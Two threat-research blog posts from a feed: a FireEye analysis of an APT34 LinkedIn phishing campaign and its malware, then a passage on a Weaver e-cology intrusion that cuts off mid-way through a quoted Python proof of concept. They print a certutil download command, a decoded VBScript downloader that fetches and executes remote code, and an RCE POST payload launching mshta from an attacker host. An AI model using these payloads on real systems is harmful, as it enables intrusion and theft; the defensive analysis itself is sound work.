    href="https://www.fireeye.com/solutions/managed-defense.html">Managed
  Defense</a> also initiated a Community Protection Event (CPE) titled
  “Geopolitical Spotlight: Iran.” This CPE was created to ensure our
  customers are updated with new discoveries, activity and detection
  efforts related to this campaign, along with other recent activity
  from Iranian-nexus threat actors to include APT33, which is mentioned
  in this <a
    href="https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html">updated
    FireEye blog post</a>.</p>
 <h4>Industries Targeted</h4>
 <p>The activities observed by Managed Defense, and described in this
  post, were primarily targeting the following industries:</p>
 <ul> <li>Energy and Utilities</li> <li>Government</li> <li>Oil and
  Gas</li> </ul>
 <h4>Utilizing Cambridge University to Establish Trust</h4>
 <p>On June 19, 2019, Mandiant Managed Defense Security Operations
  Center received an exploit detection alert on one of our FireEye
  Endpoint Security appliances. The offending application was identified
  as Microsoft Excel and was stopped immediately by FireEye Endpoint
  Security’s ExploitGuard engine. ExploitGuard is our behavioral
  monitoring, detection, and prevention capability that monitors
  application behavior, looking for various anomalies that threat actors
  use to subvert traditional detection mechanisms. Offending
  applications can subsequently be sandboxed or terminated, preventing
  an exploit from reaching its next programmed step.</p>
 <p>The Managed Defense SOC analyzed the alert and identified a
  malicious file named <span class="code">System.doc (MD5:
  b338baa673ac007d7af54075ea69660b)</span>, located in <span
  class="code">C:\Users\&lt;user_name&gt;\.templates</span>. The file
    <span class="code">System.doc</span> is a Windows Portable
  Executable (PE), despite having a <span
  class="code">&quot;doc&quot;</span> file extension. FireEye identified
  this new malware family as TONEDEAF.</p>
 <p>A backdoor that communicates with a single command and control (C2)
  server using HTTP GET and POST requests, TONEDEAF supports collecting
  system information, uploading and downloading of files, and arbitrary
  shell command execution. When executed, this variant of TONEDEAF wrote
  encrypted data to two temporary files – <span
  class="code">temp.txt</span> and <span class="code">temp2.txt</span> –
  within the same directory of its execution. We explore additional
  technical details of TONEDEAF in the malware appendix of this post.</p>
 <p>Retracing the steps preceding exploit detection, FireEye identified
  that <span class="code">System.doc</span> was dropped by a file named
    <span class="code">ERFT-Details.xls</span>. Combining endpoint- and
  network-visibility, we were able to correlate that <span
  class="code">ERFT-Details.xls</span> originated from the URL <span
  class="code">http://www.cam-research-ac[.]com/Documents/ERFT-Details.xls</span>.
  Network evidence also showed the access of a LinkedIn message directly
  preceding the spreadsheet download.</p>
 <p>Managed Defense reached out to the impacted customer’s security
  team, who confirmed the file was received via a LinkedIn message. The
  targeted employee conversed with &quot;Rebecca Watts&quot;, allegedly
  employed as &quot;Research Staff at University of Cambridge&quot;. The
  conversation with Ms. Watts, provided in Figure 1, began with the
  solicitation of resumes for potential job opportunities.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/hardpass/Picture1.png" />
  <br /> <span class="type-XS">Figure 1: Screenshot of LinkedIn message
    asking to download TONEDEAF</span></p>
 <p>This is not the first time we’ve seen APT34 utilize academia and/or
  job offer conversations in their various campaigns. These
  conversations often take place on social media platforms, which can be
  an effective delivery mechanism if a targeted organization is focusing
  heavily on e-mail defenses to prevent intrusions.</p>
 <p>FireEye examined the original file <span
  class="code">ERFT-Details.xls</span>, which was observed with at least
  two unique MD5 file hashes:</p>
 <ul> <li>
    <span class="code">96feed478c347d4b95a8224de26a1b2c</span></li> <li>
    <span class="code">caf418cbf6a9c4e93e79d4714d5d3b87</span></li> </ul>
 <p>A snippet of the VBA code, provided in Figure 2, creates <span
  class="code">System.doc</span> in the target directory from
  base64-encoded text upon opening.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/hardpass/Picture2.png" />
  <br /> <span class="type-XS">Figure 2: Screenshot of VBA code from System.doc</span></p>
 <p>The spreadsheet also creates a scheduled task named <span
    class="code">&quot;windows update check&quot;</span> that runs the
  file <span class="code">C:\Users\&lt;user_name&gt;\.templates\System
  Manager.exe</span> every minute. Upon closing the spreadsheet, a final
  VBA function will rename <span class="code">System.doc</span> to <span
    class="code">System Manager.exe</span>. Figure 3 provides a snippet
  of VBA code that creates the scheduled task, clearly obfuscated to
  avoid simple detection.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/hardpass/Picture3.png" />
  <br /> <span class="type-XS">Figure 3: Additional VBA code from System.doc</span></p>
 <p>Upon first execution of TONEDEAF, FireEye identified a callback to
  the C2 server <span class="code">offlineearthquake[.]com</span> over
  port 80.</p>
 <h4>The FireEye Footprint: Pivots and Victim Identification</h4>
 <p>After identifying the usage of <span
  class="code">offlineearthquake[.]com</span> as a potential C2 domain,
  FireEye’s Intelligence and Advanced Practices teams performed a wider
  search across our global visibility. FireEye’s Advanced Practices and
  Intelligence teams were able to identify additional artifacts and
  activity from the APT34 actors at other victim organizations. Of note,
  FireEye discovered two additional new malware families hosted at this
  domain, VALUEVAULT and LONGWATCH. We also identified a variant of
  PICKPOCKET, a browser credential-theft tool FireEye has been tracking
  since May 2018, hosted on the C2.</p>
 <p>Requests to the domain <span
  class="code">offlineearthquake[.]com</span> could take multiple forms,
  depending on the malware’s stage of installation and purpose.
  Additionally, during installation, the malware retrieves the system
  and current user names, which are used to create a three-character
  “sys_id”. This value is used in subsequent requests, likely to track
  infected target activity. URLs were observed with the following structures:</p>
 <ul> <li>
    <span
  class="code">hxxp[://]offlineearthquake[.]com/download?id=&lt;sys_id&gt;&amp;n=000</span></li> <li>
    <span
  class="code">hxxp[://]offlineearthquake[.]com/upload?id=&lt;sys_id&gt;&amp;n=000</span></li> <li>
    <span
  class="code">hxxp[://]offlineearthquake[.]com/file/&lt;sys_id&gt;/&lt;executable&gt;?id=&lt;cmd_id&gt;&amp;h=000</span></li> <li>
    <span
  class="code">hxxp[://]offlineearthquake[.]com/file/&lt;sys_id&gt;/&lt;executable&gt;?id=&lt;cmd_id&gt;&amp;n=000</span></li> </ul>
 <p>The first executable identified by FireEye on the C2 was <span
    class="code">WinNTProgram.exe (MD5:
  021a0f57fe09116a43c27e5133a57a0a)</span>, identified by FireEye as
  LONGWATCH. LONGWATCH is a keylogger that outputs keystrokes to a <span
  class="code">log.txt</span> file in the Window’s temp folder. Further
  information regarding LONGWATCH is detailed in the Malware Appendix
  section at the end of the post.</p>
 <p>FireEye Network Security appliances also detected the following
  being retrieved from APT34 infrastructure (Figure 4).</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><span class="code">GET
          hxxp://offlineearthquake.com/file/&lt;sys_id&gt;/b.exe?id=&lt;3char_redacted&gt;&amp;n=000<br />
          User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0)
          <br />  AppleWebKit/537.36 (KHTML, like Gecko)<br />  Host:
          offlineearthquake[.]com<br />  Proxy-Connection: Keep-Alive
          Pragma: no-cache HTTP/1.1</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 4: Snippet of HTTP traffic retrieving
    VALUEVAULT; detected by FireEye Network Security appliance</span></p>
 <p>FireEye identifies <span class="code">b.exe (MD5:
  9fff498b78d9498b33e08b892148135f)</span> as VALUEVAULT.</p>
 <p>VALUEVAULT is a Golang compiled version of the &quot;Windows Vault
  Password Dumper&quot; browser credential theft tool from Massimiliano
  Montoro, the developer of Cain &amp; Abel.</p>
 <p>VALUEVAULT maintains the same functionality as the original tool by
  allowing the operator to extract and view the credentials stored in
  the Windows Vault. Additionally, VALUEVAULT will call Windows
  PowerShell to extract browser history in order to match browser
  passwords with visited sites. Further information regarding VALUEVAULT
  can be found in the appendix below.</p>
 <p>Further pivoting from FireEye appliances and internal data sources
  yielded two additional files, <span class="code">PE86.dll (MD5:
  d8abe843db508048b4d4db748f92a103)</span> and <span
    class="code">PE64.dll (MD5:
  6eca9c2b7cf12c247032aae28419319e)</span>. These files were analyzed
  and determined to be 64- and 32-bit variants of the malware
  PICKPOCKET, respectively.</p>
 <p>PICKPOCKET is a credential theft tool that dumps the user's website
  login credentials from Chrome, Firefox, and Internet Explorer to a
  file. This tool was previously observed during a Mandiant incident
  response in 2018 and, to date, solely utilized by APT34.</p>
 <h4>Conclusion</h4>
 <p>The activity described in this blog post presented a well-known
  Iranian threat actor utilizing their tried-and-true techniques to
  breach targeted organizations. Luckily, with FireEye’s platform in
  place, our Managed Defense customers were not impacted. Furthermore,
  upon the blocking of this activity, FireEye was able to expand upon
  the observed indicators to identify a broader campaign, as well as the
  use of new <i>and</i> old malware.</p>
 <p>We suspect this will not be the last time APT34 brings new tools to
  the table. Threat actors are often reshaping their TTPs to evade
  detection mechanisms, especially if the target is highly desired. For
  these reasons, we recommend organizations remain vigilant in their
  defenses, and remember to view their environment holistically when it
  comes to information security.</p>
 <p>Learn more about <a
    href="/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html">Mandiant
    Managed Defense</a>, and catch an on-demand recap on this and the <a
    href="https://www.brighttalk.com/webcast/10703/445570">Top 5 Managed
    Defense attacks</a> this year.</p>
 <h4>Malware Appendix</h4>
 <h5>TONEDEAF</h5>
 <p>TONEDEAF is a backdoor that communicates with Command and Control
  servers using HTTP or DNS. Supported commands include system
  information collection, file upload, file download, and arbitrary
  shell command execution. Although this backdoor was coded to be able
  to communicate with DNS requests to the hard-coded Command and Control
  server, c[.]cdn-edge-akamai[.]com, it was not configured to use this
  functionality. Figure 5 provides a snippet of the assembly CALL
  instruction of dns_exfil. The creator likely made this as a means for
  future DNS exfiltration as a plan B.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/hardpass/Picture5.png" />
  <br /> <span class="type-XS">Figure 5: Snippet of code from TONEDEAF binary</span></p>
 <p>Aside from not being enabled in this sample, the DNS tunneling
  functionality also contains missing values and bugs that prevent it
  from executing properly. One such bug involves determining the length
  of a command response string without accounting for Unicode strings.
  As a result, a single command response byte is sent when, for example,
  the malware executes a shell command that returns Unicode output.
  Additionally, within the malware, an unused string contained the
  address 185[.]15[.]247[.]154.</p>
 <h5>VALUEVAULT</h5>
 <p>VALUEVAULT is a Golang compiled version of the “Windows Vault
  Password Dumper” browser credential theft tool from Massimiliano
  Montoro, the developer of Cain &amp; Abel.</p>
 <p>VALUEVAULT maintains the same functionality as the original tool by
  allowing the operator to extract and view the credentials stored in
  the Windows Vault. Additionally, VALUEVAULT will call Windows
  PowerShell to extract browser history in order to match browser
  passwords with visited sites. A snippet of this function is shown in
  Figure 6.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">powershell.exe /c &quot;function
            get-iehistory {. [CmdletBinding()]. param (). . $shell =
            New-Object -ComObject Shell.Application. $hist =
            $shell.NameSpace(34). $folder = $hist.Self. . $hist.Items()
            | . foreach {. if ($_.IsFolder) {. $siteFolder =
            $_.GetFolder. $siteFolder.Items() | . foreach {. $site = $_.
            . if ($site.IsFolder) {. $pageFolder = $site.GetFolder.
            $pageFolder.Items() | . foreach {. $visit = New-Object
            -TypeName PSObject -Property @{ . URL =
            $($pageFolder.GetDetailsOf($_,0)) . }. $visit. }. }. }. }.
            }. }. get-iehistory</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: Snippet of PowerShell code from
    VALUEVAULT to extract browser credentials</span></p>
 <p>Upon execution, VALUEVAULT creates a SQLITE database file in the
    <span class="code">AppData\Roaming</span> directory under the
  context of the user account it was executed by. This file is named
    <span class="code">fsociety.dat</span> and VALUEVAULT will write the
  dumped passwords to this in SQL format. This functionality is not in
  the original version of the “Windows Vault Password Dumper”. Figure 7
  shows the SQL format of the <span class="code">fsociety.dat</span> file.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/hardpass/Picture7.png" />
  <br /> <span class="type-XS">Figure 7: SQL format of the VALUEVAULT
    fsociety.dat SQLite database</span></p>
 <p>VALUEVAULT’s function names are not obfuscated and are directly
  reviewable in strings analysis. Other developer environment variables
  were directly available within the binary as shown below. VALUEVAULT
  does not possess the ability to perform network communication, meaning
  the operators would need to manually retrieve the captured output of
  the tool.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span
            class="code">C:/Users/&lt;redacted&gt;/Desktop/projects/go/src/browsers-password-cracker/new_edge.go<br />
            C:/Users/&lt;redacted&gt;/Desktop/projects/go/src/browsers-password-cracker/mozila.go<br />
            C:/Users/&lt;redacted&gt;/Desktop/projects/go/src/browsers-password-cracker/main.go<br />
            C:/Users/&lt;redacted&gt;/Desktop/projects/go/src/browsers-password-cracker/ie.go<br />
            C:/Users/&lt;redacted&gt;/Desktop/projects/go/src/browsers-password-cracker/Chrome
            Password Recovery.go</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 8: Golang files extracted during
    execution of VALUEVAULT</span>
  <b></b></p>
 <h5>LONGWATCH</h5>
 <p>FireEye identified the binary <span class="code">WinNTProgram.exe
  (MD5:021a0f57fe09116a43c27e5133a57a0a)</span> hosted on the malicious
  domain <span class="code">offlineearthquake[.]com</span>. FireEye
  identifies this malware as LONGWATCH. The primary function of
  LONGWATCH is a keylogger that outputs keystrokes to a <span
  class="code">log.txt</span> file in the Windows temp folder.</p>
 <p>Interesting strings identified in the binary are shown in Figure 9.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="624" valign="top"><span
          class="code">GetAsyncKeyState<br />
          &gt;---------------------------------------------------\n\n<br />
          c:\\windows\\temp\\log.txt<br />  [ENTER]<br />
          [CapsLock]<br />  [CRTL]<br />  [PAGE_UP]<br />
          [PAGE_DOWN]<br />  [HOME]<br />  [LEFT]<br />  [RIGHT]<br />
          [DOWN]<br />  [PRINT]<br />  [PRINT SCREEN] (1 space)<br />
          [INSERT]<br />  [SLEEP]<br />  [PAUSE]<br />
          \n---------------CLIPBOARD------------\n<br />  \n\n
          &gt;&gt;&gt;  (2 spaces)<br />
      c:\\windows\\temp\\log.txt</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 9: Strings identified in a LONGWATCH binary</span></p>
 <h5>Detecting the Techniques</h5>
 <p>FireEye detects this activity across our platforms, including named
  detection for TONEDEAF, VALUEVAULT, and LONGWATCH. <i>Table 2</i>
  contains several specific detection names that provide an indication
  of APT34 activity.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="380"> <tbody>
    <tr>
      <td width="380" valign="top"><p>
          <b>Signature Name</b></p> </td> </tr>
    <tr>
      <td width="380"
        valign="top"><p>FE_APT_Keylogger_Win_LONGWATCH_1</p> </td> </tr>
    <tr>
      <td width="380"
        valign="top"><p>FE_APT_Keylogger_Win_LONGWATCH_2</p> </td> </tr>
    <tr>
      <td width="380"
        valign="top"><p>FE_APT_Keylogger_Win32_LONGWATCH_1</p> </td> </tr>
    <tr>
      <td width="380"
        valign="top"><p>FE_APT_HackTool_Win_PICKPOCKET_1</p> </td> </tr>
    <tr>
      <td width="380"
        valign="top"><p>FE_APT_Trojan_Win32_VALUEVAULT_1</p> </td> </tr>
    <tr>
      <td width="380" valign="top"><p>FE_APT_Backdoor_Win32_TONEDEAF</p>
      </td> </tr>
    <tr>
      <td width="380" valign="top"><p>TONEDEAF BACKDOOR [DNS]</p> </td> </tr>
    <tr>
      <td width="380" valign="top"><p>TONEDEAF BACKDOOR [upload]</p>
      </td> </tr>
    <tr>
      <td width="380" valign="top"><p>TONEDEAF BACKDOOR [URI]</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: FireEye Platform Detections</span>
  <i></i></p>
 <h5>Endpoint Indicators</h5>
 <table border="1" cellspacing="0" cellpadding="0" width="100%"> <tbody>
    <tr>
      <td width="28%" valign="top"><p>
          <b>Indicator</b></p> </td> <td width="41%" valign="top"><p>
          <b>MD5 Hash (if applicable)</b></p> </td> <td width="29%" valign="top"><p>
          <b>Code Family </b></p> </td> </tr>
    <tr>
      <td width="28%" valign="top"><p>System.doc</p> </td> <td
        width="41%" valign="top"><p>
          <span class="code">b338baa673ac007d7af54075ea69660b</span></p>
      </td> <td width="29%" valign="top"><p>TONEDEAF</p> </td> </tr>
    <tr>
      <td width="28%" valign="top"><p> </p> </td> <td width="41%" valign="top"><p>
          <span class="code">50fb09d53c856dcd0782e1470eaeae35</span></p>
      </td> <td width="29%" valign="top"><p>TONEDEAF</p> </td> </tr>
    <tr>
      <td width="28%" valign="top"><p>ERFT-Details.xls</p> </td> <td
        width="41%" valign="top"><p>
          <span class="code">96feed478c347d4b95a8224de26a1b2c</span></p>
      </td> <td width="29%" valign="top"><p>TONEDEAF DROPPER</p> </td> </tr>
    <tr>
      <td width="28%" valign="top"><p> </p> </td> <td width="41%" valign="top"><p>
          <span class="code">caf418cbf6a9c4e93e79d4714d5d3b87</span></p>
      </td> <td width="29%" valign="top"><p>TONEDEAF DROPPER</p> </td> </tr>
    <tr>
      <td width="28%" valign="top"><p>b.exe</p> </td> <td width="41%" valign="top"><p>
          <span class="code">9fff498b78d9498b33e08b892148135f</span></p>
      </td> <td width="29%" valign="top"><p>VALUEVAULT</p> </td> </tr>
    <tr>
      <td width="28%" valign="top"><p>WindowsNTProgram.exe</p> </td> <td
        width="41%" valign="top"><p>
          <span class="code">021a0f57fe09116a43c27e5133a57a0a</span></p>
      </td> <td width="29%" valign="top"><p>LONGWATCH</p> </td> </tr>
    <tr>
      <td width="28%" valign="top"><p>PE86.dll</p> </td> <td width="41%" valign="top"><p>
          <span class="code">d8abe843db508048b4d4db748f92a103</span></p>
      </td> <td width="29%" valign="top"><p>PICKPOCKET</p> </td> </tr>
    <tr>
      <td width="28%" valign="top"><p>PE64.dll</p> </td> <td width="41%" valign="top"><p>
          <span class="code">6eca9c2b7cf12c247032aae28419319e</span></p>
      </td> <td width="29%" valign="top"><p>PICKPOCKET</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 2: APT34 Endpoint Indicators from this
    blog post</span>
  <b>
    <i></i></b></p>
 <h5>Network Indicators</h5>
 <p>
  <span class="code">hxxp[://]www[.]cam-research-ac[.]com</span></p>
 <p>
  <span class="code">offlineearthquake[.]com</span></p>
 <p>
  <span class="code">c[.]cdn-edge-akamai[.]com</span></p>
 <p>
  <span class="code">185[.]15[.]247[.]154</span></p>
 <h4>Acknowledgements</h4>
 <p>A huge thanks to Delyan Vasilev and Alex Lanstein for their efforts
  in detecting, analyzing and classifying this APT34 campaign. Thanks
  to Matt Williams, Carlos Garcia and Matt Haigh from the FLARE team for
  the in-depth malware analysis.</p>
http://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html2019-07-18T15:00:00.000Z2020-11-19T18:54:31.810ZCertUtil Qualms: They Came to Drop FOMBsnoemail@noemail.orgNiall Errity<p>This blog post covers an interesting intrusion attempt that Mandiant
  Managed Defense thwarted involving the rapid weaponization of a
  recently disclosed vulnerability combined with the creative use of WMI
  compiled “.bmf” files and <span class="code">CertUtil</span> for
  obfuscated execution.</p>
 <p>This intrusion attempt highlights a number of valuable lessons in
  security, chiefly: <i>attackers work fast – faster than many security
    teams can react.</i> Additionally, patching complex software
  environments while keeping the business operational makes it difficult
  to keep pace with attackers exploiting vulnerabilities, especially
  when these truths are coupled with rapid exploitation with innovative
  obfuscation methods utilizing the operating systems own feature set
  against it.</p>
 <h4>Everybody’s Working for the Recon</h4>
 <p>While monitoring our customers around the clock, <a
    href="https://www.fireeye.com/solutions/managed-defense.html">FireEye
    Managed Defense</a> identified suspicious file write activity on a
  system at a European manufacturing client and began our initial
  investigation by collecting the available volatile and non-volatile
  data from the affected host. Once evidence collection had completed,
  we began parsing the forensic data using the parsers available in <a
    href="https://fireeye.market/apps/211364">FireEye's free Redline
    forensic analysis tool.</a> Analysis of the logs quickly revealed
  that there were commands executed on the host which were consistent
  with interactive reconnaissance activity. Typically, once a host has
  successfully been compromised, attackers are presented with a command
  shell window which allows them to run commands on the host. These
  commands can consist of reconnaissance activity which expose useful
  information about the host to the attacker. The following is a snippet
  of the commands that we observed successfully executed on the host:  </p>
 <p>
  <span class="code">ipconfig.exe ipconfig /all<br />  whoami.exe whoami</span></p>
 <p>The associated parent process that handled execution of the
  aforementioned listed processes was: &quot;\Weaver\jdk_new\bin\javaw.exe&quot;. </p>
 <h4>FOMBs AWAY!</h4>
 <p>Once the attackers gained access to the web server by exploiting an
  unknown vulnerability, they attempted to further pivot control within
  the system through the use of Windows Management Instrumentation
  (WMI). They leveraged WMI's execution process, which takes Managed
  Object Format (MOF) files as input and compiles them into the WMI
  buffer, resulting in a compiled “.bmf” output file. The attackers
  wrote their second-stage payload and compiled it with WMI. Finally,
  they uploaded the compiled “.bmf” file to their web server and
  modified the file to masquerade as a &quot;.rar&quot; file .</p>
 <p>Upon further assessment of the activity, we observed that after the
  threat actors gained access to the affected web server, they utilized
  a Windows native binary called <a
    href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download">“Certutil.exe”
    to download malicious code from a remote resource</a>. Our
  investigation revealed that an instance of the process “Certutil.exe”
  was executed with the following command line arguments:   </p>
 <p>
  <span class="code">certutil  -urlcache -split<br />  -f http://[DOMAIN]/uploads/180307/l.rar c:\windows\temp\l.rar</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td valign="top"><p>
          <b>Options</b></p> </td> <td valign="top"><p>
          <b>Description </b></p> </td> </tr>
    <tr>
      <td valign="top"><p>-urlcache </p> </td> <td
          valign="top"><p>Display or delete URL cache entries</p> </td> </tr>
    <tr>
      <td valign="top"><p>-split </p> </td> <td valign="top"><p>Split
          embedded ASN.1 elements, and save to files</p> <p> </p> </td> </tr>
    <tr>
      <td valign="top"><p>-f </p> </td> <td valign="top"><p>Force
        overwrite</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">(Source: <a
      href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Microsoft
      certutil page</a>)</span></p>
 <p>FireEye has observed this methodology executed numerous times by
  both ethical hackers and unauthorized threat actors in addition to
  Certutil’s benign use as a part of legitimate business applications
  and operations.</p>
 <p>Shortly after the second-stage payload was downloaded, we observed
  several file write events related to `l.rar`
  (MD5: 4084eb4a41e3a01db2fe6f0b91064afa). Of particular note were: </p>
 <p>
  <span class="code">cmd.exe  cmd /c mofcomp.exe
    C:\Windows\temp\l.rar<br />  cmd.exe cmd /c del C:\Windows\temp\l.rar</span></p>
 <p>The aforementioned commands utilize Window's &quot;cmd.exe&quot;
  interpreter to run &quot;mofcomp.exe&quot; on the newly obtained
  &quot;l.rar&quot;. This process is designed to parse a file containing
  MOF statements and add any class and class instances <a
    href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/mofcomp">defined
    in the file to the WMI repository</a>, and subsequently delete the
  aforementioned file.</p>
 <p>The use of “mofcomp.exe” for attackers and defenders was first
  proposed at MIRcon 2014 by FireEye Mandiant incident responders <a
    href="https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf">Christopher
    Glyer and Devon Kerr in their “There’s Something about WMI” talk</a>
  (Figure 1).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/certutil/Picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Proposed use of MOF files for
    red and blue teams</span></p>
 <p>We obtained the file &quot;l.rar&quot; for further analysis and
  observed that the file header began with &quot;FOMB&quot;. This file
  header when conveniently flipped is &quot;BMOF&quot;, as in Binary
  Managed Object Format. With this information in hand we began
  searching for methods to reverse the compiled binary. Upon analyzing
  the file in FireEye's sandbox environment, we were able to obtain the
  following information from the BMOF file:</p>
 <p>
  <span class="code">On Error
    Resume Next:execmydler():Function execmydler():Set<br />
    P=CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;):P[.]Open<br />
    &quot;GET&quot;,&quot;hxxp[://[DOMAIN]/d/dl[.]asp&quot;,0:P[.]Send():b=P[.]responseText:M=Spli<br />
    t(b,&quot;,&quot;,-1,1):For Each Od In M:Nd=Nd+Chr(Od-<br />
    2):Next:Set P=Nothing:If Len(Nd) &gt; 10 Then:Execute(Nd):End If:End</span></p>
 <p>In an attempt to masquerade activities, the attackers wrote an MOF
  script and compiled it into a BMOF file, then ran the malicious BMOF
  file on the victim machine via WMI. The aforementioned code attempts
  to download a second-stage payload from
  &quot;hxxp[://[DOMAIN]/d/dl[.]asp&quot; when executed. Since the WMI
  buffer is involved, this attack vector opens the door to gaining a
  persistent foothold in the victim environment.</p>
 <p>During this research period we also found <a
    href="https://github.com/pali/bmfdec">an open-sourced project titled
  &quot;bmfdec&quot;</a> that also decompiled BMOF files. </p>
 <h4>Uncovering the Exploit</h4>
 <p>The attackers were active on September 22, and as such the majority
  of the investigation was conducted around this timeframe. Analysis of
    <a
    href="https://www.fireeye.com/solutions/hx-endpoint-security-products.html">FireEye
    Endpoint Security</a> ring buffer events uncovered reconnaissance
  commands executed on the system including <span
  class="code">whoami</span>, <span class="code">ipconfig</span> and the
  downloading of additional binaries. However, further analysis of the
  system did not uncover an initial exploit within the same timeframe of
  these commands. Analysis of the HTTP logs also did not uncover the
  initial payload. Within the HTTP logs we identified suspicious HTTP
  POST requests including requests to <span
  class="code">’/weaver/bsh.servlet.BshServlet/`</span>, but this was a
  busy server and the payload was not included in the logging, only metadata.</p>
 <p>Example HTTP log entry</p>
 <p>
  <span class="code">'-` 2886000` 10.10.10.10` -` -`
    &quot;[23/Sep/2019:10:10:10 +0800]&quot;` &quot;POST <br />
    /weaver/bsh.servlet.BshServlet/ HTTP/1.1&quot;`  &quot;-&quot;'</span></p>
 <p>FireEye Endpoint Security has the ability to collect a memory image
  and this was completed on the same day as the initial activity. As
  memory is volatile, the earlier it's collected in an investigation the
  more likely you are to uncover additional evidence. We used <a
  href="https://github.com/volatilityfoundation/volatility">Volatility</a>
  to analyze the memory image looking for any suspicious event log
  entries, process creation, registry entries, etc. While reviewing the
  memory image, we identified numerous instances of <span
  class="code">mshta.exe</span> spawned under <span
  class="code">javaw.exe</span>, the creation date for these processes
  was 2019-09-20, and we pivoted our investigative focus to that date.</p>
 <p>
  <span class="code">.. httpd.exe            2388    604      3     84
    2019-06-28 09:32:53 UTC+0000 <br />  ... java.exe            2420  
    2388      0 ------ 2019-06-28 09:32:53 UTC+0000 <br />  ....
    javaw.exe          4804   2420     36    530 2019-06-28 09:33:19
    UTC+0000 <br />  ..... javaw.exe         5976   4804    177   4925
    2019-06-28 09:33:21 UTC+0000 <br />  ...... mshta.exe       17768  
    5976     12    320 2019-09-20 14:20:00 UTC+0000 <br />  ......
    mshta.exe        9356   5976     12    306 2019-09-20 11:12:04
    UTC+0000 <br />  ...... mshta.exe       22416   5976     12    310
    2019-09-20 11:31:14 UTC+0000 <br />  ...... mshta.exe       23240  
    5976     13    318 2019-09-20 14:20:01 UTC+0000 <br />  ......
    mshta.exe       15116   5976     12    311 2019-09-20 11:31:23 UTC+0000 </span></p>
 <p>This matched our initial findings and gave us some further context.
  Unfortunately, the initially-acquired forensic evidence, including the
  endpoint triage package and the memory image, did not provide a
  conclusive filesystem narrative around that date. At this stage the
  client had pulled the system offline and began remediation steps,
  however we still didn't know exactly which exploit was leveraged to
  gain a foothold on this system. We knew the process path which
  indicated it was httpd.exe being leveraged to run malicious javaw.exe
  commands. This lined up with our HTTP log analysis, yet we didn't have
  the payload.</p>
 <h4>String it to Weaver</h4>
 <p>Anybody who's worked in incident response long enough knows that
  when parsing the data has failed to uncover the evidence you're
  looking for, the last thing you can try is sifting through the raw
  bytes and strings of a file. Volatility has a <a
    href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#strings">handy
  feature</a> to map the string offset to the corresponding process and
  virtual address. Once this is complete grep searching for specific
  keywords and filtering through the strings identified a number of HTTP
  POST requests sitting in unallocated space, expanding our grep using
  it's context parameter uncovered interesting HTTP POST requests and
  their payload.</p>
 <p>Example POST payload:</p>
 <p>
  <span class="code">POST /weaver/bsh.servlet.BshServlet/ HTTP/1.1
    <br />  Host: x.x.x.x:88 <br />  Connection: close <br />
    Accept-Encoding: gzip, deflate <br />  Accept:
    text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
    <br />  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14;
    rv:69.0) Gecko/20100101 Firefox/69.0 <br />
    Accept-Language: en-US,en;q=0.5 <br />  Upgrade-Insecure-Requests: 1
    <br />  Content-Type: application/x-www-form-urlencoded <br />
    Content-Length: 134 <br />  bsh.script=eval
    .(&quot;ex&quot;+&quot;ec(\&quot;mshta hxxp://
    www[DOMAIN]/index[.]hta\&quot;)&quot;);&amp;bsh.servlet.output=raw23; languageidweaver=7; testBanCookie=test;
    JSESSIONID=xxxxxxxxxx; Systemlanguid=7 <br />
    tBanCookie=test; Systemlanguid=7; loginidweaver=xxx <br />  st; Systemlanguid=7; loginidweaver=xxx</span></p>
 <p>We knew this was the exploit we were looking for. The payload was
  exactly what the attacker was executing and the URI confirmed the
  process path we had identified from the memory image. It was making a
  request to <span class="code">BshServlet</span>. It was unclear if
  this vulnerability was known, as there was no CVE associated with the
  software. Open source research identified a number of Chinese blog
  sites discussing a newly identified RCE vulnerability with Weaver
  e-cology OA system. The vulnerability lies within
  the BeanShell component of the OA system. The attacker could send a
  specially crafted payload to <span
  class="code">’\weaver/bsh.servlet.BshServlet`</span> in order to
  launch arbitrary commands. The following POC script was discovered on
  one of the aforementioned Chinese blog sites.</p>
 <p>MD5: 49b23c67c2a378fb8c76c348dd80ff61</p>
 <p>
  <span class="code">import requests <br />  import sys   </span></p>
 <p>
  <span class="code">headers = { <br />     'User-Agent': 'Mozilla/5.0
    (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like
